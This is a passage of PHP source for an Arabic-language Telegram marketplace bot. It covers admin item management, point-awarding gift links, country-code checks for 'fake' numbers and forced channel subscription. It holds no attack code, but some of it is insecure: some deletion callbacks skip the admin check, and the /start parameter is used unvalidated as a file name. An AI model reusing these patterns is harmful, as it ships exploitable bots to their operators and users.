💰 ¦ السعر :- *$sales[p]*
📆 ¦ التاريخ :- *$dayy - $year/$month/$day*
",
'parse_mode'=>"MarkDown",
	'reply_markup'=>json_encode([
                   'inline_keyboard'=>[
[['text'=>"بوت الماركت 🤖",'url'=>"https://t.me/$bott?start"] ] ] ])
  ]);
  $sales['sales'][$code]['name'] = $sales['n'];
  $sales['sales'][$code]['price'] = $sales['p'];
  $sales['sales'][$code]['photo'] = $message->photo[0]->file_id;
  $sales['sales'][$code]['caption'] = $message->caption;
  $sales['p'] = null;
  $sales['n'] = null;
  $sales['mode'] = "file";
  $sales["baageel"]=$code;
  $sales['allcodes'][] = $code;
  save($sales);
  exit;
 }
 }
 
 if($text != '/start'  and $sales['mode'] == 'file'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 if($message->document){
  $file_id=$message->document->file_id;
 $ty="document";
}elseif($message->video){
 $file_id=$message->video->file_id;
 $ty="video";
 }elseif($message->text){
 $file_id=$text;
 $ty="text";
}elseif($message->photo){
 $file_id=$message->photo[0]->file_id;
 $ty="photo";
 }
 $sales['sales'][$sales["baageel"]]['file']=$file_id;
 $sales['sales'][$sales["baageel"]]['file2']=$ty;
 $sales['sales'][$sales["baageel"]]['numbers']='end';
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'- تم حفظ التسليم التلقائي ✔

ارسل عدد مرات بيع السلعة

اذا تريد بيع السلعه للجميع اضغط على غير محدود ♻️',
'reply_to_message_id'=>$message->message_id, 
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- غير محدود ♻️','callback_data'=>'stengbotttt']]
      ]
    ])
  ]);
  $sales['mode'] = "Numbers";
  save($sales);
  exit;
 }
}
if(is_numeric($text) and $sales['mode'] == 'Numbers'){
	if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
		 $sales['sales'][$sales["baageel"]]['numbers']= $text;
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'
- تم حفظ عدد مرات بيع السلعة
وتم اضافة السلعه بنجاح ✅
',
'reply_to_message_id'=>$message->message_id, 
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع 🔙','callback_data'=>'stengbott']]
      ]
    ])
  ]);
  $sales['mode'] = "type";
  save($sales);
  exit;
	}
	}
if($data == "stengbotttt"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
'text'=>"*
- تم حفظ السلعه
عدد التسليم => غير محدود ♻️
*
",
'parse_mode'=>"MARKDOWN",
'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);   
}
}
 if($data == 'del'){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s'],['text'=>'تعديل ✍🏻','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'del×'.$code],['text'=>'✍🏻','callback_data'=>'edit×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'اختر ما تشاء الان',
    'reply_markup'=>$json
  ]);
  exit;
 }
 }
  $ex = explode('×',$data);
 if($ex[0] == "del"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	if($sales['sales'][$ex[1]] != null){
 	unset($sales['sales'][$ex[1]]);
  $sales['mode'] = null;
  save($sales);
$sales = json_decode(file_get_contents('sales.json'),true);
 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s'],['text'=>'تعديل ✍🏻','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'del×'.$code],['text'=>'✍🏻','callback_data'=>'edit×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'تم الحذف السلعه بنجاح...✅
اختر ما تريد مجددا ',
    'reply_markup'=>$json
  ]);
 }else{
 	 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s'],['text'=>'تعديل ✍🏻','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'del×'.$code],['text'=>'✍🏻','callback_data'=>'edit×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'السلعة غير موجودة يمكنك المحاولة مجددا',
    'reply_markup'=>$json
  ]);
 }
 }
 }
 if($ex[0] == "edit"){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	if($sales['sales'][$ex[1]] != null){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'اختر ماذا تريد ان تقوم بتعديله',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>"الاسم 👥",'callback_data'=>'Names×'.$ex[1]]],
   [['text'=>"السعر 💰",'callback_data'=>'coin×'.$ex[1]]],
   [['text'=>"الصورة و الوصف 🖼️",'callback_data'=>'photo×'.$ex[1]]],
   [['text'=>"تسليم السلعة 🎟️",'callback_data'=>'sales×'.$ex[1]]],
   [['text'=>"الكمية ♻️",'callback_data'=>'km×'.$ex[1]]],
   [["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
    ]])
  ]);
 	}else{
 	 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s'],['text'=>'تعديل ✍🏻','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'del×'.$code],['text'=>'✍🏻','callback_data'=>'edit×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'السلعة غير موجودة يمكنك المحاولة مجددا',
    'reply_markup'=>$json
  ]);
 }
 }
 }
  if($ex[0] == "Names"){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'قم بإرسال الاسم الجديد',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
    ]])
  ]);
$sales['mode'] = "name×".$ex[1];
save($sales);
 	}
 	}
  if($ex[0] == "coin"){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'قم بإرسال السعر الجديد',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
    ]])
  ]);
$sales['mode'] = "price×".$ex[1];
save($sales);
}
}
  if($ex[0] == "photo"){
if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'قم بإرسال الصورة والوصف الجديد',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
    ]])
  ]);
$sales['mode'] = "photo×".$ex[1];
save($sales);
}
}
  if($ex[0] == "sales"){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'قم بإرسال السلعة الجديد',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']]
    ]])
  ]);
$sales['mode'] = "sales×".$ex[1];
save($sales);
}
}
  if($ex[0] == "km"){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'قم بإرسال عدد مرات بيع السلعة الجديد',
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'لا نهائي ♻️','callback_data'=>'stengbotttt']]
    ]])
  ]);
  $sales['sales'][$ex[1]]['numbers'] = 'end';
$sales['mode'] = "km×".$ex[1];
save($sales);
}
}
 $ex = explode('×',$sales['mode']);
 if($sales['sales'][$ex[1]]['name'] and $message and !$data){
 if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
 	if($ex[0] == "name"){
 	$sales['sales'][$ex[1]]['name'] = $text;
 $tttype = 'الاسم';
 }elseif($ex[0] == "price"){
 	$sales['sales'][$ex[1]]['price'] = $text;
 $tttype = 'السعر';
 }elseif($ex[0] == "photo"){
 	$sales['sales'][$ex[1]]['photo'] = $photo_id;
	 $sales['sales'][$ex[1]]['caption'] = $caption;
	$tttype = 'الصورة وا الوصف';
 }elseif($ex[0] == "sales"){
 	 if($message->document){
  $file_id=$message->document->file_id;
 $ty="document";
}elseif($message->video){
 $file_id=$message->video->file_id;
 $ty="video";
 }elseif($message->text){
 $file_id=$text;
 $ty="text";
}elseif($message->photo){
 $file_id=$message->photo[0]->file_id;
 $ty="photo";
 }
  $sales['sales'][$ex[1]]['file']=$file_id;
 $sales['sales'][$ex[1]]['file2']=$ty;
 $tttype = 'السلعة';
 }elseif($ex[0] == "km"){
 	$sales['sales'][$ex[1]]['numbers'] = $text;
 $tttype = 'كمية السلع';
 }
 bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
    تم تحديث $tttype بنجاح ✓.
    ",
'reply_to_message_id'=>$message->message_id, 
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع 🔙','callback_data'=>'stengbott']]
      ]
    ])
   ]);
   $sales['mode'] = null;
   save($sales);
 }
 }
 if($text != '/start' and $text != null and $sales['mode'] == 'del'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  if($sales['sales'][$text] != null){
   bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"",
   ]);
  unlink('codejj.json',$text);
  unset($sales['sales'][$text]);
  $sales['mode'] = null;
  save($sales);
  exit;
  } else {
   bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>'خطأ - الكود غير صحيح 💢'
   ]);
  }
exit;
}
}
 if($data == 'deljj'){
 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'deljj×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'اختر السلعة المراد حذفها',
    'reply_markup'=>$json
  ]);
  exit;
 }
 $ex = explode('×',$data);
 if($ex[0] == "deljj"){
 	if($sales['sales'][$ex[1]] != null){
 	unset($sales['sales'][$ex[1]]);
  $sales['mode'] = null;
  save($sales);
$sales = json_decode(file_get_contents('sales.json'),true);
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'deljj×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$jsonn = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'تم الحذف السلعه بنجاح...✅

اختر السلعة المراد حذفها الذي تريد حذفها 

اذا لا تريد حذف السلعه اضغط على الغاء الامر ',
    'reply_markup'=>$jsonn
  ]);
 }else{
 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'اسم السلعة 🎟️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['name'],'callback_data'=>"s"],['text'=>'🗑️','callback_data'=>'deljj×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$jsonn = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'السلعة غير موجودة يمكنك المحاولة مجددا',
    'reply_markup'=>$jsonn
  ]);
 }
 }
 if($text != '/start' and $text != null and $sales['mode'] == 'del'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  if($sales['sales'][$text] != null){
   bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"",
   ]);
  unlink('codejj.json',$text);
  unset($sales['sales'][$text]);
  $sales['mode'] = null;
  save($sales);
  exit;
  } else {
   bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>'خطأ - الكود غير صحيح 💢'
   ]);
  }
exit;
}
}
$roadt = json_decode(file_get_contents('roadt.json'),true);
$fakyou1 = file_get_contents("fakyou1.txt");
if($data == "raddtt"){
bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
ارسل عدد النقاط 
      ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'إلغاء ❌','callback_data'=>"c"]],
    ]])
     ]);
   file_put_contents("fakyou1.txt","offerfree");
           }
           if(is_numeric($text) and $fakyou1 == "offerfree"){
            $codd = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,10);
            bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
تم صنع رابط بقيمة $text 💸

قم بي نسخ الرابط وضعه في موقع اختصار الروابط وقم بي بعت رابط مختصر 🔗

الرابط : 
https://t.me/$bott?start=giftt=$codd
      ",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>'رجوع 🔙','callback_data'=>"stengbott"]],
     ]])
     ]);
     $roadt['p'] = $text;
     $roadt['mode'] = "admm";
     file_put_contents("roadt.json",json_encode($roadt));
     file_put_contents($codd.".txt",$codd."\n".$text);
     unlink("fakyou1.txt");
     exit;
            }
 if($text != '/start' and $text != null and $roadt['mode'] == 'admm'){
  if(in_array($chat_id,$stingggg['stingggg']['admins']) or $chat_id == $admin){
  $code = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,10);
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"تم حفظ الرابط ✔
🏷 ¦ الكود رابط : (`$code` )

",
         "parse_mode"=>"markdown",
'reply_to_message_id'=>$message->message_id, 
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• رجوع 🔙",'callback_data'=>"stengbott"]],
]])
  ]);
  $roadt['n'] = $text;
  $roadt['roadt'][$code]['name'] = $roadt['n'];
  $roadt['roadt'][$code]['price'] = $roadt['p'];
  $roadt['p'] = null;
  $roadt['n'] = null;
  $roadt["baageel"]= $code;
  unset($roadt['mode']);
  file_put_contents("roadt.json",json_encode($roadt));
 }
 }
 
 if($data == 'dettjj'){
 	$reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'الرابط ️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s']];
 foreach($roadt['roadt'] as $code => $road){
   $reply_markup['inline_keyboard'][] = [['text'=>$road['name'],'url'=>$road['name']],['text'=>'🗑️','callback_data'=>'dettjj×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$json = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'اختر الرابط المراد حذفها',
    'reply_markup'=>$json
  ]);
  exit;
 }
 $ex = explode('×',$data);
 if($ex[0] == "dettjj"){
 	unset($roadt['roadt'][$ex[1]]);
  file_put_contents("roadt.json",json_encode($roadt));
$roadt = json_decode(file_get_contents('roadt.json'),true);
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'الرابط ️','callback_data'=>'s'],['text'=>'حذف 🗑️','callback_data'=>'s']];
 foreach($roadt['roadt'] as $code => $road){
   $reply_markup['inline_keyboard'][] = [['text'=>$road['name'],'url'=>$road['name']],['text'=>'🗑️','callback_data'=>'dettjj×'.$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- إلغاء الأمر 🚫','callback_data'=>'stengbott']];
$jsonn = json_encode($reply_markup);
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'تم الحذف الرابط بنجاح...✅

اختر الرابط المراد حذفها الذي تريد حذفها 

اذا لا تريد حذف رابط اضغط على الغاء الامر ',
    'reply_markup'=>$jsonn
  ]);
 }
             if(preg_match("/^\/(start)(.*)/s",$text)){
$ex1 = explode(' ',$text);
 $ex = explode('=',$ex1[1]);
if($ex[0] == "giftt"){
$cood = explode("\n",file_get_contents($ex[1].".txt"));
$coin = $cood[1];
 if(is_file($ex[1].'.txt')){
  if(!in_array($from_id,$roadt['mjjjyty'][$ex[1]])){
  bot('sendmessage',[
   'chat_id'=>$admin,
   'text'=>"
يوجد شخص قام بي تخطي الرابط وحصل على نقاط $coin 😌
معلومات عنه 🧐:
ايديه 🆔 : [$from_id](tg://user?id=$from_id)
معرفه ان وجد ⁦Ⓜ️⁩ : [@$user](tg://user?id=$from_id)
اسمه ✨ : [$name](tg://user?id=$from_id)
   ",'parse_mode'=>"MarkDown"]);
    bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   لقد ربحت $coin نقطة 🤑
   ",'reply_to_message_id'=>$message_id
]);
$sales[$from_id]['collect'] += $coin;
$roadt['mjjjyty'][$ex[1]][] = $from_id;
save($sales);
    }else{
       bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>"
لقد قمت بل تخطي الرابط من قبل
   ",'reply_to_message_id'=>$message_id,
   ]);
    }
   }
 }
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

$fake = explode("\n",file_get_contents('fake.txt'));
$countries = json_decode(file_get_contents('countries.json'),true);
$countts = count($fake)-1;
$eysbott = $countries['numeys'] + 22;
$nobott = $countries['numno'] + 0;
if($data == "ajddnum"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
اهلا بك عزيزي الادمن
هاذ القسم يحتوي على سماح بدوله وا حظر دوله 📞
( تحقق من الوهمي ) ♻️

اذا تريد حظر دوله من استخدام البوت اضغط على حظر دوله وتبع الخطوات ❇

وا اذا تريد سماح بدوله بس استخدام البوت اضغط على سماح بدوله وتبع الخطوات ♻️
*",
'parse_mode'=>"MarkDown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"سماح بي دوله ✴","callback_data"=>"addnum"],["text"=>"حظر دوله 🔅","callback_data"=>"delnum"]],
[["text"=>"عدد الوهميين قامو بدخول بوتك «".$countts."» ☣","callback_data"=>"ttu74565"]],
[["text"=>"عدد الدول المحظوره «".$nobott."» 🚫","callback_data"=>"ttu74565"],["text"=>"عدد دول المسموحه «".$eysbott."» ✔","callback_data"=>"ttu74565"]],
[["text"=>"رجوع ،🔙.","callback_data"=>"stengbott"]],
]])
]);
}
if($data == "addnum"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
اهلا بك عزيزي الادمن ارسل رمز الدوله بدون + لسمح الدوله بي دخول البوت
مثل 
962
964
966
ارسل رمز دوله واحده فقط *",
'parse_mode'=>"MarkDown",
]);
$sales['hfutg'] = 'end';
save($sales);
}
if($data == "delnum"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*
اهلا بك عزيزي الادمن ارسل رمز الدوله بدون + لحظر الدوله من البوت
مثل 
962
964
966
ارسل رمز دوله واحده فقط *",
'parse_mode'=>"MarkDown",
]);
$sales['hfutg1'] = 'end';
save($sales);
}
if($message){
$carab = [966,973,965,968,974,971,213,269,253,20,964,962,961,218,222,212,970,252,249,963,216,967];
$countries = json_decode(file_get_contents('countries.json'),true);
if($update){
if($countries[$carab[0]] !== "ok"){
foreach($carab as $key){
$countries[$key] = "ok";
file_put_contents('countries.json',json_encode($countries,64|128|256));
}}}
if(is_numeric($text) and $sales['hfutg'] == 'end'){
if(isset($text) && ! empty ($text)){
$json = json_decode(file_get_contents('https://raw.githubusercontent.com/AnasSbeinati/A-list-of-countries-Arabic-names-and-codes-in-JSON/master/countries.json'),true);
for($i=0;$i<=count($json)-1;$i++){
if($json[$i]['dialCode'] == $text){
break;}}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
- رمز الدولة : $text
\n - تم السماح لمستخدمين ارقام هذه الدولة باستخدام البوت 💯",
'reply_to_message_id'=>$message_id,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"ajddnum"]],
]])
]);
$countries['numeys'] += 1;
$countries[$text] = "ok";
file_put_contents('countries.json',json_encode($countries));
unset($sales['hfutg']);
save($sales);
}
}
if(is_numeric($text) and $sales['hfutg1'] == 'end'){
if(isset($text) && ! empty ($text)){
$json = json_decode(file_get_contents('https://raw.githubusercontent.com/AnasSbeinati/A-list-of-countries-Arabic-names-and-codes-in-JSON/master/countries.json'),true);
for($i=0;$i<=count($json)-1;$i++){
if($json[$i]['dialCode'] == $text){
break;}}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
- رمز الدولة : $text
\n - تم عدم السماح لمستخدمين ارقام هذه الدولة باستخدام البوت 💯",
'reply_to_message_id'=>$message_id,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ،🔙.","callback_data"=>"ajddnum"]],
]])
]);
$countries['numno'] += 1;
$countries[$text] = "no";
file_put_contents('countries.json',json_encode($countries));
unset($sales['hfutg1']);
save($sales);
}
}
$v = explode("\n",file_get_contents('v.txt'));
if(in_array($from_id,$fake)){
exit;}
if(in_array($from_id,$admin) && !in_array($from_id,$v)){
file_put_contents('v.txt',$from_id . "\n",FILE_APPEND);}
if($update->message->contact && !in_array($from_id,$v) && !in_array($from_id,$fake) && !$text && !in_array($from_id,$admin)){
if($update->message->from->id == $update->message->contact->user_id){
$num1 = str_split ($update->message->contact->phone_number,1);
$num2 = str_split ($update->message->contact->phone_number,2);
$num3 = str_split ($update->message->contact->phone_number,3);
$num4 = str_split ($update->message->contact->phone_number,4);
if($countries[$num1[0]] == "ok" || $countries[$num2[0]] == "ok" ||$countries[$num3[0]] == "ok" || $countries[$num4[0]] == "ok"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
تم التحقق بانك ليست روبوت تهانينا ☺

- يمكن استخدام البوت من الآن عزيزي 🌸

- ارسل /start",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'remove_keyboard'=>true,
]),
]);
file_put_contents('v.txt',$from_id . "\n",FILE_APPEND);
sleep(2);
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
exit;
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم حظرك لاستخدمك رقم وهمي ☺",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'remove_keyboard'=>true,
]),
]);
$sales['allllyhya'] -= 1;
save($sales);
file_put_contents('fake.txt',$from_id . "\n",FILE_APPEND);
sleep(2);
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
}}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"الرجاء ارسال رقم صحيح 😑",
'reply_to_message_id'=>$message_id,
]);
return false;
}}}
 #---------------

#──────────────
$status = jamalusd('getChatMember',['chat_id'=>$CHHHH,'user_id'=>$from_id])->result->status and $botsjj['botss'] == 'on';
  if($status != "member" and $status != "creator" and $status != "administrator" and $botsjj['botss'] == 'on'){
if($message and $botsjj['botss'] == 'on'){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $CHHHH
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",
      'reply_to_message_id'=>$message_id,
]);
	}
	if($data and $botsjj['botss'] == 'on'){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $CHHHH
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",
]);
		}
		exit();
}
$status = jamalusd('getChatMember',['chat_id'=>$CHHHH2,'user_id'=>$from_id])->result->status and $botsjj['botsss'] == 'on';
  if($status != "member" and $status != "creator" and $status != "administrator" and $botsjj['botsss'] == 'on'){
if($message and $botsjj['botsss'] == 'on'){
 bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $CHHHH2
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",
      'reply_to_message_id'=>$message_id,
]);
 }
 if($data and $botsjj['botsss'] == 'on'){
  bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $CHHHH2
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",
]);
  }
  exit();
}
$tokeen = file_get_contents('../../tokeen.txt');
$check = json_decode(file_get_contents('https://api.telegram.org/bot'.$tokeen.'/getChat?chat_id='.$from_id),true)['ok'];
$urli = json_decode(file_get_contents("https://api.telegram.org/bot$tokeen/getMe"));
$userrto = $urli->result->username;
$nameto = $urli->result->first_name;
if($check != true and $botsjj['tokk'] == 'on'){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"عليك الاشتراك في البوت @$userrto 🤖
ثم اضغط على /start",
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>$nameto. "🤖",'url'=>"https://t.me/".$userrto]],
]])
]);
return false;
}
	$ch = $stinggja['stinggja']['ch1'];
$bot_id = bot('getme',['bot'])->result->id;
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$bot_id])->ok;
if($ch != null and $ok == "true"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
		}
		return false;
}
}
$ch = $stinggja['stinggja']['ch2'];
